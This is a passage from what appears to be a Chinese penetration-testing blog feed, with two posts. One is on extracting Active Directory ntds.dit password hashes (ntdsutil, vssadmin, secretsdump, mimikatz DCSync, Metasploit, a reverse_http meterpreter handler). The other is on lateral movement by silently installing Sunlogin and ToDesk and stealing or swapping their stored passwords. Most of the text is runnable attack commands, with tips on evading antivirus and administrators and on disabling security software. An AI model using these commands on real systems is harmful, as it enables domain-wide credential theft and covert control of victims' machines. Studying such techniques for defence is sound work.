412baa5a-8ed7-43dd-8d05-adcdacff8c89</p><p>第二步：加载快照</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">ntdsutil<span class="hljs-selector-class">.exe</span> snapshot <span class="hljs-string">&quot;mount &#123;412baa5a-8ed7-43dd-8d05-adcdacff8c89&#125;&quot;</span> <span class="hljs-selector-tag">q</span> q<br></code></pre></td></tr></table></figure><p>可以看到快照的地址为 C:\$SNAP_202310241441_VOLUMEC$</p><p><img src="/img/image-20231024144308936.png" alt="image-20231024144308936"></p><p>第三步：复制快照中的ntds.dit文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">copy</span><span class="language-bash"> <span class="hljs-string">&#x27;快照地址\Windows\NTDS\ntds.dit&#x27;</span> 目标地址</span><br></code></pre></td></tr></table></figure><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">copy C:<span class="hljs-symbol">\$</span>SNAP_202310241441_VOLUMEC$\Windows\NTDS<span class="hljs-symbol">\n</span>tds.dit C:\Users\Administrator\Desktop<span class="hljs-symbol">\n</span>tds<span class="hljs-symbol">\n</span>tds.dit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024144728139.png" alt="image-20231024144728139"></p><img src="/img/image-20231024144827916.png" alt="image-20231024144827916" style="zoom:80%;" /> <p>第四步：删除快照</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ntdsutil.exe snapshot &quot;umount &#123;412baa5a<span class="hljs-string">-8</span>ed7<span class="hljs-string">-43</span>dd<span class="hljs-string">-8</span>d05-adcdacff8c89&#125;&quot; &quot;delete &#123;412baa5a<span class="hljs-string">-8</span>ed7<span class="hljs-string">-43</span>dd<span class="hljs-string">-8</span>d05-adcdacff8c89&#125;&quot; q q<br></code></pre></td></tr></table></figure><h3 id="vssadmin提取ntds-dit"><a href="#vssadmin提取ntds-dit" class="headerlink" title="vssadmin提取ntds.dit"></a>vssadmin提取ntds.dit</h3><p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统Provider创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的 “diff空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p><p>第一步：创建快照</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">vssadmin create shadow /<span class="hljs-attribute">for</span>=c:<br></code></pre></td></tr></table></figure><p> {a7624614-2c64-43da-9034-96e064941bae}</p><p><img src="/img/image-20231024145326265.png" alt="image-20231024145326265"> </p><p>第二步：复制文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit <span class="hljs-name">C</span>:\Users\Administrator\Desktop\ntds\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024145557749.png" alt="image-20231024145557749"></p><p>第三步：删除快照</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vssadmin <span class="hljs-keyword">delete</span> shadows <span class="hljs-regexp">/for=c: /</span>quiet<br></code></pre></td></tr></table></figure><h3 id="vssown提取ntds-dit"><a href="#vssown提取ntds-dit" class="headerlink" title="vssown提取ntds.dit"></a>vssown提取ntds.dit</h3><p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动 和停止卷影复制服务</p><p>第一步：启动卷影复制服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript vssown.vbs /start<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024150330877.png" alt="image-20231024150330877"> </p><p>第二步：创建一个C盘的卷影副本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript vssown.vbs /create c<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024150346331.png" alt="image-20231024150346331"> </p><p>第三步：列出当前卷影副本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cscript vssown.vbs /list<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024150427754.png" alt="image-20231024150427754"></p><p>第四步：复制文件：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\NTDS\ntds.dit <span class="hljs-name">C</span>:\Users\Administrator\Desktop\ntds\ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024150510776.png" alt="image-20231024150510776"></p><p>第五步：删除卷影副本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">cscript vssown.vbs /<span class="hljs-built_in">delete</span> &#123;<span class="hljs-number">89370742</span>-<span class="hljs-number">3E24</span>-<span class="hljs-number">4B58</span>-A4D8-4C5FA200D367&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024150646817.png" alt="image-20231024150646817"></p><h3 id="IFM"><a href="#IFM" class="headerlink" title="IFM"></a>IFM</h3><p>可以通过创建一个 IFM 的方式获取 ntds.dit，在使用 ntdsutil 创建媒体安装集（IFM）时，需要进行生成快照、加载、将 ntds.dit 和计算机的 SAM 文件复制到目标文件夹中等操作，这些操作也可以通过 PowerShell 或 VMI 远程执行。</p><p>第一步：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ntdsutil</span> <span class="hljs-string">&quot;ac i ntds&quot;</span> <span class="hljs-string">&quot;ifm&quot;</span> <span class="hljs-string">&quot;create full c:/test&quot;</span> q q<br></code></pre></td></tr></table></figure><p>此时 ntds.dit 将被保存在 C:\test\Active Directory 下，SYSTEN 和 SECURITY 两个文件将被保存在C:\test\registry 文件夹下</p><img src="/img/image-20231024150817222.png" alt="image-20231024150817222" style="zoom:80%;" /> <p><img src="/img/image-20231024150848008.png" alt="image-20231024150848008"> </p><p>第二步：删除</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rmdir</span> /s/q C:\<span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>通过 impacket 里的 secretsdump.exe 脚本可以直接远程读取 ntds.dit 并导出哈希值</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">secretsdump.exe 域名/administrator:密码<span class="hljs-symbol">@IP</span> -outputfile output_ntds<br></code></pre></td></tr></table></figure><h2 id="2-离线方式读取ntds-dit文件（建议）"><a href="#2-离线方式读取ntds-dit文件（建议）" class="headerlink" title="2.离线方式读取ntds.dit文件（建议）"></a>2.离线方式读取ntds.dit文件（建议）</h2><p>优点：不会报毒   缺点：需要传输ntds和system文件</p><p>离线一般需要两步：</p><p> 1、将远端域控的ntds.dit下载到本地，</p><p> 2、然后利用再在本地进行。 </p><p>注意：因为system.hive里存放着 ntds.dit 的秘钥，所以需要转储 system.hive ，不然没法查看 ntds.dit 里内容</p><p>命令如下：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">reg <span class="hljs-built_in">save</span> hklm\<span class="hljs-built_in">system</span> c:\<span class="hljs-built_in">system</span>.hive<br></code></pre></td></tr></table></figure><p>下面介绍几种方式离线读取ntds.dit文件</p><h3 id="esedbexport"><a href="#esedbexport" class="headerlink" title="esedbexport"></a>esedbexport</h3><p>1、以kali为例子，安装esedbexport</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk">apt-get install autoconf automake autopoint libtool pkg-config<br>wget https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/libyal/</span>libesedb<span class="hljs-regexp">/releases/</span>download<span class="hljs-regexp">/20230318/</span>libesedb-experimental-<span class="hljs-number">20230318</span>.tar.gz<br>tar zxvf libesedb-experimental-<span class="hljs-number">20230318</span>.tar.gz<br>cd libesedb-<span class="hljs-number">20230318</span><br>./configure<br>make<br>make install<br>ldconfig<br></code></pre></td></tr></table></figure><p>将导出的文件放到该目录下</p><img src="/img/image-20231024153433922.png" alt="image-20231024153433922" style="zoom:80%;" /> <p>2、导出 ntds.dit，两个重要的表为：datatable以及link_table，他们都会被存放在.&#x2F;ntds.dit.export&#x2F;文 件夹中</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">esedbexport</span> -m tables ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024153627833.png" alt="image-20231024153627833"></p><p>3、安装 ntdsxtract</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/csababarta/</span>ntdsxtract<br>cd ntdsxtract<br>python2 setup.py build<br>python2 setup.py install<br></code></pre></td></tr></table></figure><p>如果提示 ImportError: No module named Crypto.Hash，请执行 pip install pycryptodome</p><p>4、将 ntds.dit.export 和 SYSTEM 文件放入到 ntdsxtract 工具的文件夹中，然后导出哈希值，最后的结果将保存在 1.txt 里</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">python2 dsusers</span><span class="hljs-string">.</span><span class="hljs-comment">py ntds</span><span class="hljs-string">.</span><span class="hljs-comment">dit</span><span class="hljs-string">.</span><span class="hljs-comment">export/datatable</span><span class="hljs-string">.</span><span class="hljs-comment">4 ntds</span><span class="hljs-string">.</span><span class="hljs-comment">dit</span><span class="hljs-string">.</span><span class="hljs-comment">export/link_table</span><span class="hljs-string">.</span><span class="hljs-comment">7 output</span> <span class="hljs-literal">--</span><span class="hljs-comment">syshive SYSTEM</span> <span class="hljs-literal">--</span><span class="hljs-comment">passwordhasher</span> <span class="hljs-literal">--</span><span class="hljs-comment">pwdformat ocl</span> <span class="hljs-literal">--</span><span class="hljs-comment">ntoufile atout</span> <span class="hljs-literal">--</span><span class="hljs-comment">lmoufile lmout | tee 1</span><span class="hljs-string">.</span><span class="hljs-comment">txt</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231024160754284.png" alt="image-20231024160754284" style="zoom:80%;" />  <img src="/img/image-20231024160734212.png" alt="image-20231024160734212" style="zoom:80%;" />  <h3 id="impacket-1"><a href="#impacket-1" class="headerlink" title="impacket"></a>impacket</h3><p>将 ntds.dit.export 和 SYSTEM 文件放入到 和secretsdump.exe 同级目录下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">secretsdump.exe -<span class="hljs-keyword">system</span> <span class="hljs-keyword">system</span>.hive -ntds ntds.dit <span class="hljs-keyword">LOCAL</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024161101499.png" alt="image-20231024161101499"></p><h3 id="NTDSDump-exe"><a href="#NTDSDump-exe" class="headerlink" title="NTDSDump.exe"></a>NTDSDump.exe</h3><p>NTDSDumpEx.exe 可以进行导出哈希值的操作</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">NTDSDumpEx<span class="hljs-selector-class">.exe</span> -d ntds<span class="hljs-selector-class">.dit</span> -s system<span class="hljs-selector-class">.hive</span> -o <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024161733259.png" alt="image-20231024161733259"></p><p><img src="/img/image-20231024161710546.png" alt="image-20231024161710546"></p><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals是powershell脚本，可以离线读取ntds文件 </p><p>安装DSInternals</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Install</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-variable">DSInternals</span> <span class="hljs-operator">-</span><span class="hljs-variable">Force</span><br></code></pre></td></tr></table></figure><p>导出 hash，并保存在 txt 文件里</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$key</span> = Get-Bootkey -<span class="hljs-params">System</span>HivePath <span class="hljs-string">&#x27;system路径&#x27;</span><br>Get-ADDBAccount -<span class="hljs-literal">All</span> -DBPath <span class="hljs-string">&#x27;ntds路径&#x27;</span> -Bootkey <span class="hljs-variable">$key</span> | Out-<span class="hljs-keyword">File</span> output_hash.txt<br></code></pre></td></tr></table></figure><h2 id="3-在线方式读取ntds-dit文件"><a href="#3-在线方式读取ntds-dit文件" class="headerlink" title="3.在线方式读取ntds.dit文件"></a>3.在线方式读取ntds.dit文件</h2><p>优点：不用传输文件  缺点：容易报毒</p><p>在线的方式就是直接读取不需要在导出ntds文件,在域环境中，不要直接在线获取hash，特别是域环境比较大的时候，在线获取hash等待时时间较长，工具占用资源太多，容易造成域控服务器崩溃</p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>1、可以读取所有用户的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lsadump::dcsync /domain:hack.com /all /csv<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024165017064.png" alt="image-20231024165017064"></p><p>2、也可以读取单个用户的hash</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">lsadump::dcsync <span class="hljs-regexp">/domain:hack.com /u</span>ser:administrator<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024165440160.png" alt="image-20231024165440160"> </p><h3 id="Quarks-PwDump"><a href="#Quarks-PwDump" class="headerlink" title="Quarks PwDump"></a>Quarks PwDump</h3><p>1、上传工具到目标机器，使用命令先导出ntds文件，然后直接读取</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shell QuarksPWDump<span class="hljs-selector-class">.exe</span> <span class="hljs-attr">--dump-hash-domain</span> <span class="hljs-attr">--ntds-file</span> ntds.dit<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024165727968.png" alt="image-20231024165727968"></p><h3 id="impacket-2"><a href="#impacket-2" class="headerlink" title="impacket"></a>impacket</h3><p>使用secretsdump直接读取</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">secretsdump.exe 域名/administrator:密码<span class="hljs-symbol">@IP</span> -outputfile output_ntds<br></code></pre></td></tr></table></figure><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">例如：secretsdump.exe hack/jack:<span class="hljs-symbol">Admin123@</span><span class="hljs-number">10.210</span><span class="hljs-number">.100</span><span class="hljs-number">.10</span> -outputfile <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024170218881.png" alt="image-20231024170218881"></p><h3 id="Invoke-DCSync"><a href="#Invoke-DCSync" class="headerlink" title="Invoke-DCSync"></a>Invoke-DCSync</h3><p>Invoke-DCSyncs是powershell脚本可以在线读取内存中的用户hash</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-PWDumpFormat</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231024171006721.png" alt="image-20231024171006721"></p><h2 id="4-MSF读取ntds-dit文件"><a href="#4-MSF读取ntds-dit文件" class="headerlink" title="4.MSF读取ntds.dit文件"></a>4.MSF读取ntds.dit文件</h2><h3 id="离线读取"><a href="#离线读取" class="headerlink" title="离线读取"></a>离线读取</h3><p>离线读取使用msf读取ntds文件，前提是msf必须和域控在相同网段，我们可以使用代理技术，将msf代理到内 网，然后使用msf导出ntds文件</p><p>1、使用导出模块进行导出</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">use auxiliary<span class="hljs-regexp">/admin/</span>smb/psexec_ntdsgrab<br></code></pre></td></tr></table></figure><p>2、填写相关的选项，主要有 IP,域，用户名和密码</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> RHOSTS <span class="hljs-comment">10.210.100.10</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">SMBDomain hack.com</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbuser administrator</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">smbpass Admin@123</span><br>run<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231025202120476.png" alt="image-20231025202120476"></p><p>3、运行之后 ntds和system文件会被保存到&#x2F;root&#x2F;.msf4&#x2F;loot下</p><p><img src="/img/image-20231025202840398.png" alt="image-20231025202840398"></p><p>4、在相应的目录下找到该文件</p><p>5、使用相应的工具读取该文件即可</p><h3 id="在线读取"><a href="#在线读取" class="headerlink" title="在线读取"></a>在线读取</h3><p>1、使用cs或者其他的方式先上线的msf中使用派生会话的方式</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gams">use exploit/multi/handler<br><span class="hljs-keyword">set</span> payload <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_http</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lhost</span> 本机<span class="hljs-comment">ip</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport</span> 接受的端口<br>exploit 执行<br></code></pre></td></tr></table></figure><img src="/img/image-20231025203518377.png" alt="image-20231025203518377" style="zoom:80%;" /> <p>cs设置msf派生会话的监听器</p> <img src="/img/image-20231025204037867.png" alt="image-20231025204037867" style="zoom:50%;" /><img src="/img/image-20231025204213021.png" alt="image-20231025204213021" style="zoom:67%;" /> <p><img src="/img/image-20231025204352658.png" alt="image-20231025204352658"></p><p>2、拿到shell之后执行hashdump，如果不能执行就迁移进程到64位中</p><p><img src="/img/image-20231025204552391.png" alt="image-20231025204552391"></p><p>失败原因：使用的32位程序 使用migrate进行进程迁移</p><img src="/img/image-20231025204714172.png" alt="image-20231025204714172" style="zoom:67%;" /> <p><img src="/img/image-20231025204747885.png" alt="image-20231025204747885"></p><p>3、或者使用下面的脚本，也可以读取域内的hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">use post/windows/gather/smart_hashdump<br><span class="hljs-built_in">set</span> session <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231025204927322.png" alt="image-20231025204927322"></p>]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网横向移动</title>
    <link href="/2023/11/03/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <url>/2023/11/03/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="内网横向移动"><a href="#内网横向移动" class="headerlink" title="内网横向移动"></a>内网横向移动</h1><h2 id="1-利用向日葵横向移动"><a href="#1-利用向日葵横向移动" class="headerlink" title="1 利用向日葵横向移动"></a>1 利用向日葵横向移动</h2><h3 id="向日葵介绍"><a href="#向日葵介绍" class="headerlink" title="向日葵介绍"></a>向日葵介绍</h3><p>向日葵远程控制软件是一款免费的集远程控制电脑&#x2F;手机&#x2F;平板、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件，且还能进行远程文件传输、远程摄像头监控等。</p><p>支持系统：Winodws&#x2F;Linux&#x2F;MacOS&#x2F;Android&#x2F;iOS</p><p>CS上线机器–&gt;上传向日葵</p><h3 id="向日葵远控连接（11-1版本-目前已失效无法连接服务器）"><a href="#向日葵远控连接（11-1版本-目前已失效无法连接服务器）" class="headerlink" title="向日葵远控连接（11.1版本  目前已失效无法连接服务器）"></a>向日葵远控连接（11.1版本  目前已失效无法连接服务器）</h3><p>向日免安装的时候第一次会进入选择界面</p><img src="/img/image-20231016100449917.png" alt="image-20231016100449917" style="zoom: 80%;" /><p>选择暂不安装，以绿色版本运行，注册表中会写入值：</p><p><img src="/img/image-20231016100743216.png" alt="image-20231016100743216"></p><p>可以将其导出为1.reg，然后删除，下次又会先让用户选择</p><p>执行1.reg，再次运行向日葵就不会选择，直接进入绿色版 </p><p>内容：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">Windows Registry Editor Version <span class="hljs-number">5.00</span><br><br>[HKEY_CURRENT_USER\Software\Oray\SunLogin\SunloginClient]<br><span class="hljs-string">&quot;11.1.0.37237_IsRunSeted&quot;</span>=<span class="hljs-string">&quot;1&quot;</span><br></code></pre></td></tr></table></figure><p>保存成reg文件上传到被控机器，然后执行</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> regedit -s <span class="hljs-number">3</span>.<span class="hljs-keyword">reg</span><br><span class="hljs-keyword">shell</span> SunLoginClient.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><img src="/img/image-20231016102046026.png" alt="image-20231016102046026" style="zoom:80%;" /><p>获取密码：桌面截图–&gt;cs开启vnc</p><p>缺陷：需要有人提前点击过查看验证码</p><p><img src="/img/image-20231016102331028.png" alt="image-20231016102331028"></p><p>查看向日葵配置文件</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">shell <span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\ProgramData\Oray\SunloginClient\config.ini<br>fastcode：本机识别码去掉k<br>encry_pwd：本机验证码，密文无法直接解密<br></code></pre></td></tr></table></figure><img src="/img/image-20231016102848763.png" alt="image-20231016102848763" style="zoom:80%;" /><p>解密密码 </p><p>使用github提供的脚本文件进行解密</p><p><a href="https://github.com/wafinfo/Sunflower_get_Password">https://github.com/wafinfo/Sunflower_get_Password</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> SunDecrypt.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016103215870.png" alt="image-20231016103215870"></p><p>至此拿到了本机识别码和本机验证码</p><p><strong>使用向日葵进行连接–&gt;连接后–&gt;搜集信息（远程桌面凭证，保存敏感文件、数据），关闭杀软，作为跳板控制内网中的其他机器</strong></p><h2 id="2-利用todesk横向移动"><a href="#2-利用todesk横向移动" class="headerlink" title="2 利用todesk横向移动"></a>2 利用todesk横向移动</h2><h3 id="todesk介绍"><a href="#todesk介绍" class="headerlink" title="todesk介绍"></a>todesk介绍</h3><p>ToDesk是一款类似向日葵的远程控制软件，但比向日葵、TV和AD更为流畅和稳定，它同样具备着内网穿透、文件 传输、云端同步和流量加密等功能 </p><p>有绿色精简版和全功能版两个版本，支持的系统有：Winodws&#x2F;Linux&#x2F;MacOS&#x2F;Android&#x2F;iOS</p><h3 id="todesk安装"><a href="#todesk安装" class="headerlink" title="todesk安装"></a>todesk安装</h3><p>全功能版在双击运行、命令行执行时都会出现UAC弹窗和安装界面，这样非常容易被管理员发现，&#x2F;S参数可以实现 静默安装</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">shell</span> ToDesk1.<span class="hljs-keyword">exe</span> /S<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016104508221.png" alt="image-20231016104508221"></p><p>安装完成后自动运行，接下来查看配置文件</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">type</span> C:\&quot;Program Files (x86)<span class="hljs-string">&quot;\ToDesk\config.ini</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016104641446.png" alt="image-20231016104641446"></p><p>运行ToDesk后会在默认安装目录下生成一个config.ini配置文件，存储的有设备代码、临时密码、安全密码以及登 录用户和密码等重要敏感信息，但密码都经过ToDesk特有加密算法加密，所以不能通过解密得到明文密码，只需 要找到目标主机ToDesk中的tempAuthPassEx临时密码或authPassEx安全密码，将它们覆盖到我们本地ToDesk中 的tempAuthPassEx，重启ToDesk即可得到明文密码  使用cs进行文件替换</p><p>创建新的config.ini文件</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">826856</span>deb<span class="hljs-number">6881894e3</span>dcca<span class="hljs-number">4</span>a<span class="hljs-number">019</span><span class="hljs-keyword">c</span><span class="hljs-number">605</span>a<span class="hljs-number">334</span>f<span class="hljs-number">289e26193</span>ae<span class="hljs-number">06</span>abdea<span class="hljs-number">4</span>cf<span class="hljs-number">0</span>d<span class="hljs-number">714</span>da<span class="hljs-number">3</span>f<span class="hljs-number">4768</span>cbabd<span class="hljs-number">5734</span>bf<span class="hljs-number">187</span>bd<span class="hljs-number">701</span>bc<span class="hljs-number">0</span>b<span class="hljs-number">2</span>ae<span class="hljs-number">4</span>acee<span class="hljs-number">22e9909</span><br>密码：<span class="hljs-number">317606</span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016105101542.png" alt="image-20231016105101542"></p><p>替换后重启进程即可</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">tasklis 查找进程<br>taskkill <span class="hljs-regexp">/pid 2328 /</span>F<br>taskkill <span class="hljs-regexp">/pid 1196 /</span>F<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016105438125.png" alt="image-20231016105438125"></p><p><img src="/img/image-20231016105549835.png" alt="image-20231016105549835"></p><p>查看配置文件：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">shell</span><span class="language-bash"> <span class="hljs-built_in">type</span> C:\&quot;Program Files (x86)<span class="hljs-string">&quot;\ToDesk\config.ini</span></span><br></code></pre></td></tr></table></figure><p><img src="/img/image-20231016110003089.png" alt="image-20231016110003089"></p><p><img src="/img/image-20231016110039961.png" alt="image-20231016110039961"></p><p><strong>连接后–&gt;搜集信息（远程桌面凭证，保存敏感文件、数据），关闭杀软，作为跳板控制内网中的其他机器</strong></p><h2 id="3-利用GoToHTTP横向移动"><a href="#3-利用GoToHTTP横向移动" class="headerlink" title="3 利用GoToHTTP横向移动"></a>3 利用GoToHTTP横向移动</h2><h3 id="GoToHTTP介绍"><a href="#GoToHTTP介绍" class="headerlink" title="GoToHTTP介绍"></a>GoToHTTP介绍</h3><p>GotoHTTP工作在B2C模式。使用远程控制时，您不必在每一台电脑上都安装远程软件。不管身处何处，<strong>有浏览器 就能访问远程电脑</strong>。 即使公司网络管控，仍然可以控制或被控制。支持文件传输、无人值守、剪切板同步、远程语 音、远程摄像头、多显示器支持 </p><p>下载：<a href="http://www.gotohttp.com/goto/download.12x">http://www.gotohttp.com/goto/download.12x</a></p><h3 id="GoToHTTP使用"><a href="#GoToHTTP使用" class="headerlink" 